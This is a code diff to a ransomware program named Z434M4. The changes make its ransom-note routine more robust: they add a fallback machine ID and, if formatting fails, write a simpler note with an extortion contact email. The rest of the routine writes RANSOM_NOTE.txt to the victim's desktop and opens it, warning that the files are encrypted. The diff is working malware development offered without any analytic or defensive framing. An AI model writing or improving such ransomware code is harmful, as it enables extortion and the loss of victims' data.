@@ -124,6 +124,9 @@ def create_ransom_note():
         desktop = os.path.join(os.path.expanduser("~"), "Desktop")
         note_path = os.path.join(desktop, "RANSOM_NOTE.txt")
         
+        # Check if machine_id exists, use a default if not
+        machine_id = getattr(variables, 'machine_id', 'UNKNOWN-ID-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8)))
+        
         with open(note_path, "w") as f:
             f.write("""
 YOUR FILES HAVE BEEN ENCRYPTED!
@@ -144,11 +147,17 @@ DO NOT attempt to decrypt files yourself or use third-party software.
 This will permanently damage your files.
 DO NOT rename encrypted files.
 DO NOT delete the Z434M4 program or any related files.
-            """.format(variables.machine_id))
+            """.format(machine_id))
             
         # Make ransom note visible by opening it
         os.startfile(note_path)
         return True
     except Exception as e:
         print(f"Error creating ransom note: {str(e)}")
+        # Try to write a simpler note if formatting failed
+        try:
+            with open(note_path, "w") as f:
+                f.write("YOUR FILES HAVE BEEN ENCRYPTED! Contact z434m4.mohamedmahrous@gmail.com for recovery.")
+        except:
+            pass
         return False
